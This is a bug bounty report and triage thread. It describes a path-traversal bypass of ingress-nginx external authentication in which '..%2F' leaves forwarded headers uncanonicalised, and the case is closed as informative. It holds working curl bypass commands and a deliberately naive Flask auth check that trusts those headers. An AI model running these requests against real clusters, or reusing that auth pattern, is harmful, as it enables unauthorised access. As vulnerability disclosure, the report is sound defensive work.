title: Attacker can bypass authentication build on ingress external auth (`nginx.ingress.kubernetes.io/auth-url`)
vulnerability_information:
Report Submission Form

## Summary:
Sending request with `<public-service>..%2F<protected-service>` allows to manipulate headers:

* X-Original-Url
* X-Auth-Request-Redirect

due to that manipulation external auth service could make wrong decision and return 204 instead of 401/403. **To be clear: manipulation of those headers give no possibility to kubernetes user to make any proper decisions based on those headers. ** This way allowing anonymous access to public service and trying to protect access to protected-service by e.g. api-key is not possible.

{F1469913}

Example:
With this call `curl -v http://app.test/public-service/..%2Fprotected-service/protected` external auth configured on ingress using `nginx.ingress.kubernetes.io/auth-url: http://auth-service.default.svc.cluster.local:8080/verify` will get following headers:
```
X-Request-Id: 7d979c82ca55141ed0d58655fbaac586
Host: auth-service.default.svc.cluster.local
X-Original-Url: http://app.test/public-service/..%2Fprotected-service/protected
X-Original-Method: GET
X-Sent-From: nginx-ingress-controller
X-Real-Ip: 192.168.99.1
X-Forwarded-For: 192.168.99.1
X-Auth-Request-Redirect: /public-service/..%2Fprotected-service/protected
Connection: close
User-Agent: curl/7.75.0
Accept: */*
```
Both headers `X-Original-Url` and `X-Auth-Request-Redirect` are manipulated. 

How this auth-service can parse request? Here is simple example of python and Flask:
```
api_key = request.headers.get('X-Api-Key')
request_redirect = request.headers.get('X-Auth-Request-Redirect')

if request_redirect and request_redirect.startswith("/public-service/"):
    return Response(status = HTTPStatus.NO_CONTENT)

if api_key == "secret-api-key":  
    return Response(status = HTTPStatus.NO_CONTENT)

return Response(status = HTTPStatus.UNAUTHORIZED)
```

## Kubernetes Version:
minikube v1.23.2 on Microsoft Windows 10 Pro 10.0.19043 Build 19043
Kubernetesa v1.22.2 on Docker 20.10.8

## Component Version:
k8s.gcr.io/ingress-nginx/controller:v1.0.0-beta.3@sha256:44a7a06b71187a4529b0a9edee5cc22bdf71b414470eff696c3869ea8d90a695

## Steps To Reproduce:

  1. Download project in attachment: F1469916
  2. Install minikube
  3. Enable addon ingress and ingress-dns
  4. Build docker images:

    * `cd auth-service; docker build -t auth-service:0.0.4 .`
    * `cd protected-service; docker build -t protected-service:0.0.1 .`
    * `cd public-service; docker build -t public-service:0.0.1 .`

  5. push docker images into minikube:

    * `minikube image load auth-service:0.0.4`
    * `minikube image load protected-service:0.0.1`
    * `minikube image load public-service:0.0.1`

  6. apply kubernetes configuration: `kubectl apply -f app.yaml`

To access public service: `curl -v http://app.test/public-service/public`
To access protected service: `curl -v http://app.test/protected-service/protected -H "X-Api-Key: secret-api-key"`
To access protected service bypassing authentication: `curl -v http://app.test/public-service/..%2Fprotected-service/protected`

## Supporting Material/References:

  * in F1469916 - project consist of 2 services: public and protected. Access to public should be available for anyone and to protected only with `X-Api-Key` header. auth-service is protecting access and configured as external auth on ingress.
    * app.yaml - whole configuration
    * auth-service, protected-service, public-service - directories with Dockerfiles to build

## Additional note
At first I have found this vulnerability in old version of ingress-nginx. It was 0.70.0. With this old version bypass was working without encoding of / to %2F.
e.g. `curl -v http://app.test/public-service/../protected-service/protected`
I was not able to reproduce it locally with minikube (couldn't install old ingress addon), but there is possibility that for some older versions of ingress-nginx you don't need to encode / to %2F.

## Impact

Attacker can bypass authentication build on ingress external auth (`nginx.ingress.kubernetes.io/auth-url`). 

Attacker can manipulate `X-Original-Url` and `X-Auth-Request-Redirect` headers. Due to this kubernetes user is not able to make safe assumption on those headers.

activities.message: Hi. Is there anything I can help with ?

Hello @thisbug and thanks for your report,

Yes, you can help.

How do I do this? 

> Enable addon ingress and ingress-dns

When I run `minikube start --addons ingress-dns ingress --vm=true` this is the error it gives


```
Due to networking limitations of driver docker on darwin, ingress-dns addon is not supported.
Alternatively to use this addon you can use a vm-based driver:

	'minikube start --vm=true'
```

Best regards,
@turtle_shell l

Hi.

Ingress-dns addon is not necessary. It's helper to get smooth dns resolution.

I was doing this on windows, and using virtualbox driver https://minikube.sigs.k8s.io/docs/drivers/virtualbox/ 
Using docker driver on windows I was not able to turn on ingress addon (don't mean ingress-dns, but normal ingress).

Hope that help
Added video with demo: F1475153

# ingress-dns

More about your ingress-dns problem. So ingress-dns is not needed but you need to add `app.test` to your `/etc/hosts` file:
```
minikube start
minikube addons enable ingress
minikube ip
```
take this ip and add it to `/etc/hosts`:
```
<minikube ip> app.test
```

# run on windows with virtualbox driver

I think, that Windows is not necessary to reproduce this vulnerability.

On Windows I'm using virtualbox driver, because I couldn't get working default (docker driver) with ingress. On MaOS it can be different.
So on Windows I'm doing following steps:
```
minikube start --driver=virtualbox --no-vtx-check
minikube addons enable ingress
minikube addons enable ingress-dns
Get-DnsClientNrptRule | Where-Object {$_.Namespace -eq '.test'} | Remove-DnsClientNrptRule -Force; Add-DnsClientNrptRule -Namespace ".test" -NameServers "$(minikube ip)"
```

# on more curl trick

It turn out that trick with `../` is working same way as `..%2F` but I needed to add `--path-as-is` to curl

```
$ curl --path-as-is -v http://app.test/public-service/../protected-service/protected
*   Trying 192.168.99.109:80...
* Connected to app.test (192.168.99.109) port 80 (#0)
> GET /public-service/../protected-service/protected HTTP/1.1
> Host: app.test
> User-Agent: curl/7.75.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Fri, 08 Oct 2021 19:48:10 GMT
< Content-Type: application/json
< Content-Length: 26
< Connection: keep-alive
<
{"data":"protected data"}
* Connection #0 to host app.test left intact
```
@turtle_shell: Do you need any more help with reproducing this bug ?

Mitigation
=====================

In short: `X-Auth-Request-Redirect` and/or `X-Original-Url` should be canonize same way as request path is canonize in ingress. Also those headers should be documents in kubernetes docs as users are making authentication/authorization decisions based on them.

### Details
| Request|      Ingress path|  X-Original-Url| X-Auth-Request-Redirect| Description |
|----------|-------------|------|------|-------|
| public-service/public |  public-service/ | http://app.test/public-service/public  | /public-service/public | Ingress path matching request and headers -> fine
| /public-service/../protected-service/protected |    protected-service/ |   http://app.test/public-service/../protected-service/protected | /public-service/../protected-service/protected | Request was canonize and decision was made to pass it to `protected-service/` but headers are not canonize. Why there is no 404 response ? There is no ingress path for `/public-service/../protected-service`
I did hear from you for some time. Do you need any assistance for reproducing this bug ?

Hello @thisbug and thanks for your report,

```console
% kubectl apply -f app.yaml
error: You must be logged in to the server (the server has asked for the client to provide credentials)
```

Do you know why?

Best regards,
@turtle_shell

This is some kind of problem with credentials to minikube.
Can you get list of pods ?

Try to use:
```
minikube kubectl -- get pods
```
and maybe later:
```
minikube kubectl -- apply -f app.yaml
```
Basically, be sure that your minikube cluster is operational, e.g. you can get pods and deploy to it. After that you can apply app.yaml
Do you need any assistance for reproducing this bug ? Did you manage to run minikube fully operational ?

I understand that running minikube with ingress is not so easy. For me it's really painful, and I need to try several times before it startup. You not necessary need to run it on minikube, you can do it also on some other Kubernetes instance. 

It's almost 4 weeks passed since I have reported this issue and you didn't even reproduce it. Not really mentioning understanding the problem, which is not easy, as it's in the edge between nginx-ingress and nginx itself. 

If you are not able to reproduce it, I will report this problem to kubernetes team directly.

Problem explanation
=============

After doing some of experiments, I ask myself is this is really Kubernetes vulnerability or maybe someone else.
Let's think about it.
Bug can be in:
1. ingress-nginx
2. nginx
3. my custom code of auth-service

### ingress-nginx
In ingress controller pod, you can find nginx.conf file that is containing following:
{F1490502}
As you can see, it's ingress-nginx generated configuration that is setting those headers.
You can find relevant code generating this configuration in https://github.com/kubernetes/ingress-nginx/blob/af7d9581f47113f4e2cfd7fac92ba02ae9cd49f0/rootfs/etc/nginx/template/nginx.tmpl#L1020

### ingress
Probably yes. I don't know. That would be worth to talk about with Kubernetes security team.

### my custom code of auth-service
Trusting headers is usually bad idea ;) but in this case there is a lot of code in internet this is trusting at least X-Original-Url header. One of quite used in external auth scenario is: https://github.com/travisghansen/external-auth-server. There is request_js plugin (https://github.com/travisghansen/external-auth-server/blob/master/PLUGINS.md#request_js) which is exactly made for this case. There are describing it in documentation:
{F1490513}

@turtle_shell: I would like to thank you for time you are spending on this problem. It's not easy to reproduce scenarios that are based on minikube. I hope that my today explanation is helpful for you. In any case you can reach me. I'm happy to help.

I still can't put this addon `ingress`


```console
% minikube addons enable ingress
  Due to networking limitations of driver docker on darwin, ingress addon is not supported.
Alternatively to use this addon you can use a vm-based driver:

	'minikube start --vm=true'

To track the update on this work in progress feature please check:
https://github.com/kubernetes/minikube/issues/7332
```

I'll need to ask a colleague for help here.

Best regards,
@turtle_shell

Hi,

Thanks for trying. Are you sure, you have latest version of minikube for MacOS ? 
I can see in release page that, minikube support ingress:
>Support Ingress on MacOS, driver docker #12089

And of course you can try with vm driver, but I will not able to support you. As I have Windows machine.
>minikube start --vm=true

Mitigation
===========

I have found out quite nice mitigation. Instead of of using `X-Original-Url` and `X-Auth-Request-Redirect` one can set different headers using `more_set_input_headers` module like this:
```
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: my-ingress
  annotations:
    nginx.ingress.kubernetes.io/rewrite-target: /$1
    nginx.ingress.kubernetes.io/auth-url: http://auth-service.default.svc.cluster.local:8080/verify
    nginx.ingress.kubernetes.io/configuration-snippet: |
      more_set_input_headers "X-Forwarded-Scheme: $scheme";
      more_set_input_headers "X-Forwarded-Uri: $uri";
      more_set_input_headers "X-Forwarded-Prefix: $service_name";
      more_set_input_headers "X-Forwarded-Host: $http_host";
spec:
  rules:
    - host: app.test
      http:
        paths:
          - path: /public-service/(.*)
            pathType: Prefix
            backend:
              service:
                name: public-service
                port:
                  number: 8080
          - path: /protected-service/(.*)
            pathType: Prefix
            backend:
              service:
                name: protected-service
                port:
                  number: 8080
```

**This is very similar what Traefik ingress in doing.**
Here is output from Traefik to compare with ingress-nginx:
{F1495955}
This can be inspiration for Kubernetes developers for fix.

@turtle_shell Hi, any updates ? Did your colleague was able to reproduce this bug ? 

If still no luck, I can reproduce it on public cloud provider, e.g. Amazon EKS. Just tell me to which cloud providers you have access at hackerone.

Hi @thisbug,

Can you please provide step-by-step instructions on how to reproduce this using Amazon EKS? 

Regards,
@tuxedo

Hi @tuxedo,

Here are steps to reproduce on EKS:

* `aws configure` - if not done already
* create new EKS cluster using eksctl (for details check: https://docs.aws.amazon.com/eks/latest/userguide/getting-started-eksctl.html). I think you can safely use us regions, e.g. us-west-2.
```
eksctl create cluster \
 --name my-cluster \
 --region eu-central-1
```
* install ingress-nginx using helm chart
```
helm repo add ingress-nginx https://kubernetes.github.io/ingress-nginx
helm repo update

kubectl create namespace nginx-ingress
helm install ingress-nginx ingress-nginx/ingress-nginx -n nginx-ingress
```
* deploy application using app.yaml from attachment: F1502937
```
kubectl apply -f app.yaml
```
* find ingress-nginx external address
```
kubectl get svc -n nginx-ingress
```
{F1502938}
This external address need some time until amazon dns make it available. To be sure it's ready check it with: `nslookup <dns>` 
**Note:** There could be problem that your local dns, cache this address as not-existent domain. If so, go to https://www.nslookup.io and check what is ip address of this "external-ip" column. After that add this ip address to your /etc/hosts with domain name of "external-ip". In my case it was:
```
3.65.169.186 a31bf3ae9dc9a4be790f6024881f9d5f-2008807762.eu-central-1.elb.amazonaws.com
```

* run curls. Replace my dns a31bf3ae9dc9a4be790f6024881f9d5f-2008807762.eu-central-1.elb.amazonaws.com with your.
```
curl --path-as-is -v http://a31bf3ae9dc9a4be790f6024881f9d5f-2008807762.eu-central-1.elb.amazonaws.com/public-service/public # return 200
curl --path-as-is -v http://a31bf3ae9dc9a4be790f6024881f9d5f-2008807762.eu-central-1.elb.amazonaws.com/protected-service/protected # return 401
curl --path-as-is -v http://a31bf3ae9dc9a4be790f6024881f9d5f-2008807762.eu-central-1.elb.amazonaws.com/protected-service/protected -H "X-Api-Key: secret-api-key" # return 200
curl -v http://a31bf3ae9dc9a4be790f6024881f9d5f-2008807762.eu-central-1.elb.amazonaws.com/public-service/..%2Fprotected-service/protected # return 200
curl --path-as-is -v http://a31bf3ae9dc9a4be790f6024881f9d5f-2008807762.eu-central-1.elb.amazonaws.com/public-service/../protected-service/protected # return 200
```
As you can see last two are bypassing external authentication with path traversal.

* check auth-service logs:
{F1502945}
Both headers `X-Original-Url` and `X-Auth-Request-Redirect` are containing path traversal, which is security risk.

When it comes to root cause, I have put my analysis in previous posts.

Hope this helped,
In case of any problems, do not hesitate to ask. Especially this dns part can be bumpy.

Hi @tuxedo, @turtle_shell ,

I have found one more way to reproduce it on minikube. Instead of using addon for ingress, just deploy it using helm. Steps are as follow:

1. Update minikube to latest version. I'm using v1.24.0. (it works on older version also, but it's better to use latest)
2. [Optional] Delete all old clusters: `minikube delete --all=true --purge=true`
3. `minikube start` - I'm using kubernetes in version v1.22.3
4. Deploy ingress-nginx using helm

```
helm upgrade --install ingress-nginx ingress-nginx \
  --repo https://kubernetes.github.io/ingress-nginx \
  --namespace ingress-nginx --create-namespace
```
Here is my version:
{F1510001}

5. Check if pod and service are up: `kubectl get all -n ingress-nginx`

{F1510002}

Everything looks good

6. apply kubernetes configuration: `kubectl apply -f app.yaml`

7. wait a bit until pods are up
{F1510003}

8. In second terminal run port forward to ingress service: `kubectl port-forward service/ingress-nginx-controller -n ingress-nginx 8080:80`
{F1510005}

9. Test basic functionality

```curl http://127.0.0.1:8080/public-service/public -H "Host: app.test"```
{F1510008}

```curl http://127.0.0.1:8080/protected-service/protected  -H "Host: app.test"```
{F1510010}

```curl http://127.0.0.1:8080/protected-service/protected -H "X-Api-Key: secret-api-key" -H "Host: app.test"```
{F1510012}

Those responses looks good. For /public-service you don't need X-Api-Key, but for /protected-service you need.

10. Exploitation

```curl -v http://127.0.0.1:8080/public-service/..%2Fprotected-service/protected  -H "Host: app.test"```
{F1510013}

```curl --path-as-is -v http://127.0.0.1:8080/public-service/../protected-service/protected  -H "Host: app.test"```
{F1510014}

Exploitation successful, external auth was bypassed.

11. Logs of auth-service

{F1510018}

Headers are containing path traversal

That's all. Root cause and everything else stays the same.

In case of questions, just let me know.

Hi @thisbug, Thank you for the updated instructions! I'm trying to reproduce this with the updated minikube instructions and am getting the following response for every cURL command in step 9: ``` 404 Not Found

404 Not Found

nginx
``` Is there anything I might be missing? If you don't mind, can you please include a video demonstrating how to reproduce this? Regards, @tuxedo

@tuxedo,

Thanks a lot for picking it up.

I forgot to add latest app.yaml file :(

There is one difference in `my-ingress` definition: `kubernetes.io/ingress.class: "nginx"` 

Check attachment: F1510434

If you still will not able to proceed, then I will do video.

I also added whole project as zip, just in case.

Best,
@thisbus

Hi @tuxedo,

Did you managed to check if now everything works ? 

Best,
@thisbug

Hello @thisbug,

Thank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.

Thanks,
@tuxedo

Hi @tuxedo,

Thanks for your help in triaging!

I have also sent an email to security@kubernetes.io at 7th of November, using my private email: niemiec.marcin@gmail.com. I'm writing this to avoid marking as duplicate. This was mention in email from security@kubernetes.io.

Best,
@thisbug

Hi Kubernetes,

Did you manage to identify this issue ? 

You might be interested in similar issue in Apache APISIX: https://apisix.apache.org/blog/2021/11/23/cve-2021-43557-research-report

Best,
thisbug

Any news regarding this report ?

Best,
thisbug

Hi @tuxedo, @tuxedo,

Is there anything new regarding this report ?

Best,
thisbug
Hi @thisbug - Unfortunately, I do not have any updates for you at this time, but you will be updated as soon as there is additional information to share. Thanks for your patience!
Thanks for your patience. We're still working with the maintainers of ingress-nginx to coordinate a fix and a release.
Thanks for update
@thisbug How would you like to be credited (if at all) in the CVE?

Hi @cjcullen,

Thanks for reward. It's nice Christmas gift :)

About CVE, yes, I would like to be credited. You can put my real name: Marcin Niemiec, with my email: niemiec.marcin@gmail.com
I have also prepared draft of blog post about this vulnerability, maybe can be linked somehow in cve?

Two questions about bounty:
1. Is source code of ingress-nginx in scope of Tier 1 or Tier 2 ? I was thinking based on description that it's Tier 1 ? 
2. I would propose to reconsider severity to high. Take a look on my similar finding in APISIX: CVE-2021-43557. In my opinion there is high severity as many developers trusting those headers need to check and fix their code. I have found already some 3rd party solutions relaying on those headers.

Best,
thisbug

Ingress-nginx is a non-core component, which falls under tier 2: https://hackerone.com/kubernetes.

As for severity, I scored this as "Low" for both Confidentiality and Integrity since "Access to some restricted information is obtained, but the attacker does not have control over what information is obtained, or the amount or kind of loss is constrained." My understanding is that this vulnerability affects services configured in a specific way, and not all services. Happy to hear more, though.

@cjcullen 

Thanks for clarification about tiers. 

As gut feeling I would also think about it as medium. But looking on CVSS 3.0, I would set Scope to Changed in your calculation. This external authentication service can belong to different authority, not the same as ingress-nginx. 

Best,
thisbug

@cjcullen 

Hi any news, regarding this ticket ? In terms of CVSS and CVE ?

Best,
thisbug

@cjcullen 
Hi any news, regarding this ticket ? In terms of CVSS and CVE ?
Best,
thisbug

@cjcullen
Hi any news, regarding this ticket ? In terms of CVSS and CVE ?
Best,
thisbug

@cjcullen
Hi any news, regarding this ticket ? In terms of CVSS and CVE ?
Best,
thisbug

Hi,

The ingress-nginx maintainers have convinced me that this is not an actual security vulnerability, so there will be no CVE. They have asked that you open a public issue [here](https://github.com/kubernetes/ingress-nginx/issues/new?assignees=&labels=kind%2Fbug&template=bug_report.md&title=) so that the community can decide how to handle this particular setup.

I'm sorry this experience has been so bad. There has been quite a bit of high-latency back and forth behind the scenes, and we didn't keep you properly updated on the progress. I hope you continue digging into Kubernetes and Kubernetes subprojects and reporting your findings here. We truly appreciate the diligence in this report, and your patience in how long it took to be resolved.

Thanks,
-CJ
Closing as informative.
